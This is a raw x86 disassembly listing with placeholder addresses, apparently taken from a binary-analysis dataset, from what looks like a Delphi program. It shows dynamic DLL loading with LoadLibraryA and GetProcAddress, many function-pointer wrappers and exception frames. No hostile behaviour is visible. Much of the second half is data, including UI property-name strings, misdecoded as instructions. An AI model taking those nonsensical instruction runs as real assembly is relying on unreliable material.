pop ebp
retn 0x18
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_3a90f50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_3a90fdc
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_3a91048
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebp 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push ebx
push edi
push esi
call [ rw-data ]
mov ebp eax
jmp r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
push edi
push esi
call [ rw-data ]
mov ebp eax
sub_3a910c0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_3a90e94
xor eax eax
push ebp
push sub_3a91277
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9127e
mov eax [ rw-data ]
call sub_3a90e9c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_3a91280
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_3a90e94
xor eax eax
push ebp
push sub_3a91633
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9163a
mov eax [ rw-data ]
call sub_3a90e9c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_3a919e4
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_3a91a0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a91a54
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a91a5b
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_3a64380
call sub_3a910c0
cmp [ rw-data ] 0x0
jg r-xdata
sub_3a91a60
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_3a91afc
push ebx
push esi
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push esi
call [ rw-data ]
mov ebx eax
sub_3a91b8c
push ecx
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
xor eax eax
pop edx
retn
mov eax esp
call sub_3a91afc
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov al 0x1
pop edx
retn
sub_3a91bb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a91beb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a91bf2
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_3a91cb5
dec [ ebx - 0x56e34340 ]
add ecx [ edi ]
or cl [ ecx + 0x53 ]
push 0x496c6c65
je r-xdata
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x65705372
arpl [ ecx + 0x72 ] ax
jb r-xdata
insd
xor al 0x11
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
push ds
insd
add [ ebx + 0x18 ] 0xe7
out dx al
inc edx
mov esp 0x61e2a155
retn
add [ esp + edx - 0x75 ] dh
inc ebp
or [ eax - 0x75 ] dl
inc ebp
cld
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
jns r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
sub_3a91d47
inc [ eax ]
add [ eax ] al
add [ esi ] al
push ebx
push 0x6a624f6c
nop
pop eax
sbb eax 0xb0f03a9
dec ecx
inc esi
imul ebp [ ebp + 0x44 ] 0x6f6c6169
test [ si ] bl
test eax 0x51360103
clc
inc edx
jle r-xdata
pushfd
inc ebx
test ecx esi
in al 0x7
pop ebp
adc ebx [ edi - 0x38 ]
push es
push ebx
push 0x6a624f6c
pop ss
add bh bh
dec [ ebp - 0x74aaffc0 ]
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_3a91d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_3a91e34
cmp [ esi ] bl
test eax 0x540b0303
push esp
js r-xdata
inc ebp
dec esp
popad
jns r-xdata
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax eax
xchg edx eax
stosd [ edi ]
add ebx [ ebx - 0x55 ]
add esp [ eax ]
adc eax 0xaad003ab
outsd
jb r-xdata
outsb
jne r-xdata
cmpsd [ esi ] [ edi ]
add edi [ esi + ebx * 2 ]
test eax 0xa960a803
add edx eax
stosb [ edi ]
inc ebp
insb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + ebx ] dh
test eax 0x6c740503
push esp
outsd
jo r-xdata
add ebx [ eax ]
out dx al
stosb [ edi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
inc ebx
and [ 0xffffffffaad003ab ] dl
jae r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
je r-xdata
mov al 0x56
test eax 0xab0c4803
add eax [ esp + ecx - 0x55 ]
add edx [ ecx - 0x1397fc55 ]
stosb [ edi ]
add eax [ eax - 0x1bfc550b ]
hlt
in al 0x3a
test al 0x3
adc [ esi ] bh
test al 0x3
insb
jae r-xdata
je r-xdata
or [ ebx + 0x74 ] dl
inc ebx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
outsd
insd
jo r-xdata
inc ebx
outsb
je r-xdata
pop ds
test eax 0x1a403
add ah bh
mov bh 0xaa
pop ds
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax - 0x27fc56e1 ] bh
pop ds
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
insb
jae r-xdata
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
or [ esi ] bh
test al 0x3
imul esi [ ebx + 0x8 ] 0x43647453
insb
imul esi [ eax + 0x73 ] 0x53087369
je r-xdata
jb r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
js r-xdata
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
je r-xdata
je r-xdata
test eax 0x54110303
inc ebp
insb
insb
imul esi [ eax + 0x73 ] 0x6f507369
jae r-xdata
outsd
je r-xdata
inc edx
insb
insb
imul esi [ eax + 0x73 ] 0x650e7369
jo r-xdata
inc ebp
test eax 0x70650603
dec esi
mov eax 0xd803a91f
je r-xdata
add ebx eax
popad
je r-xdata
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
test eax 0xa91fd803
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi + ebx - 0x57 ] dh
add eax [ esi ]
jo r-xdata
add esp [ edx + edx ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
inc ebp
insb
insb
imul esi [ eax + 0x73 ] 0x650d7369
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
push cs
jo r-xdata
add esp [ ecx + eax - 0x48040000 ]
stosb [ edi ]
sub_3a92014
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
and [ ecx + 0x1a803 ] ch
add ah dl
push ds
test eax 0xa83df003
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add esp [ edx + edx ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax eax
xchg edx eax
stosd [ edi ]
add ebx [ ebx - 0x55 ]
add esp [ eax ]
adc eax 0xaad003ab
cmpsd [ esi ] [ edi ]
add edi [ esi + ebx * 2 ]
test eax 0xa960a803
add ebx [ eax ]
out dx al
stosb [ edi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
mov al 0x56
test eax 0xab0c4803
add eax [ esp + ecx - 0x55 ]
add edx [ ecx - 0x1397fc55 ]
stosb [ edi ]
add eax [ eax - 0x1bfc550b ]
hlt
sub_3a9291c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x3a92a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp - 0x57 ] bl
add esi [ eax + 0x2 ]
add [ eax ] al
dec esp
daa
test eax 0xa83df003
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edi [ eax + 0x1803a96a ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp ]
stosd [ edi ]
add ebx [ eax - 0x13fc5478 ]
test eax 0xa6431803
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
test al 0x61
test eax 0xab82bc03
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
sub ebp [ ebx - 0x547767fd ]
add ebp esp
sub_3a92c3b
std
stosb [ edi ]
add esi [ ebp + edi * 8 - 0x56 ]
add eax [ eax ]
add [ eax ] al
add [ 0x1aff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
sbb [ ebx ] 0x0
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
mov al [ 0x7403aa ]
add bh bh
pop esp
daa
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
outsd
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
dec eax
imul esp [ ebp + 0x53 ] 0x63656c65
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
push ds
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0xa6100073
add ebx ecx
add [ eax ] eax
call [ esi + edi * 2 ]
stosd [ edi ]
add edi [ eax ]
jle r-xdata
push r-xdata
pop edx
add al [ eax ]
call [ ebx ]
outsd
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070024 ] al
insd
dec esi
popad
insd
cmp al 0x10
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x2 ]
add bh bh
in al 0x62
test eax 0x103
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x614d0900
js r-xdata
test al 0x3
push 0x7cff0000
cld
add al 0x46
outsd
outsb
je r-xdata
and [ ecx ] 0x0
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax + eax ]
mov eax 0x7003a873
add [ eax ] al
[ eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
je r-xdata
add [ eax ] eax
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ esi + 0x5a03 ] ah
outsb
je r-xdata
outsb
shl [ eax + 0x1b803aa ] 0x0
adc [ esi + 0x25903 ] ah
call eax
bound ebp [ ecx + 0x103 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
or eax 0x65646948
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add dh bh
push 0x84fe0000
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jo r-xdata
add [ gs : eax ] dl
xor eax [ esp + esi * 4 - 0x6a ]
stosb [ edi ]
add edi [ esi ]
add bh bh
jle r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add esp [ eax ]
add bh bh
jo r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
test eax 0x103
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ es : edx ] cl
dec edi
inc ebp
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebx [ edx + 0x2 ]
add bh bh
adc al 0x63
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax 0x72440a00
popad
inc ebx
jne r-xdata
sahf
stosb [ edi ]
add esi [ eax + 0x7e ]
ja r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002d ] al
outsd
jo r-xdata
outsb
je r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
daa
add [ esi ] cl
push eax
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
outsb
je r-xdata
jae r-xdata
dec ebp
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ cs : eax ] cl
push edx
popad
dec edi
outsb
je r-xdata
popad
jae r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ ecx ]
add bh bh
mov ah 0xfc
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
xor eax [ eax + eax + 0x10 ]
dec [ eax ]
jg r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
or dl [ eax + 0x61 ]
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add bh bh
jl r-xdata
jb r-xdata
adc [ esi + 0x25603 ] ah
jmp [ eax ]
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] cl
push ebx
push 0x6948776f
outsb
inc ebx
push 0x27e07261
adc [ esi + 0x8d03 ] ah
push 0x6948776f
outsb
je r-xdata
outsb
insb
jns r-xdata
dec edi
add eax [ ecx ]
jo r-xdata
outsb
jne r-xdata
adc [ esi + 0x8e03 ] ah
jb r-xdata
add [ eax ] al
add [ ecx ] ch
add [ ebx ] cl
push eax
popad
add [ eax ] al
sub [ eax ] eax
or edx [ eax + 0x61 ]
adc [ esi + 0x1dd03 ] ah
inc [ esi + edi * 2 - 0x55 ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
stosb [ edi ]
add ecx [ esp + edi * 8 + 0x3aa ]
add [ eax - 0x80000000 ] al
and [ eax ] eax
stosd [ edi ]
sahf
stosb [ edi ]
add ecx [ edi - 0x70010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
cld
stosd [ edi ]
add esi eax
jle r-xdata
stosb [ edi ]
add eax [ eax + 0x3cff0000 ]
sti
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
sub al 0x0
adc [ esi + 0x25503 ] ah
[ eax + 0x103a963 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
xor [ ecx ] 0x0
js r-xdata
lahf
stosb [ edi ]
add ecx [ eax - 0x47fc5505 ]
sti
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040031 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add esp [ eax + 0x2 ]
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080033 ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0035 ] al
outsb
jne r-xdata
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add edx [ edi ]
add bh bh
test al 0xfa
stosb [ edi ]
add esp esp
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
xor al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xfc656c62
add al 0x54
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
inc ebx
outsd
outsb
je r-xdata
add edx [ eax ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ebx ]
stosd [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070034 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0e00
add [ eax ] al
add [ eax + 0x4f0a0038 ] al
outsb
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
push 0xf803aaa6
push eax
outsd
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
jb r-xdata
add [ eax ] al
jo r-xdata
sbb al 0xa3
stosb [ edi ]
add eax eax
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
jb r-xdata
je r-xdata
jne r-xdata
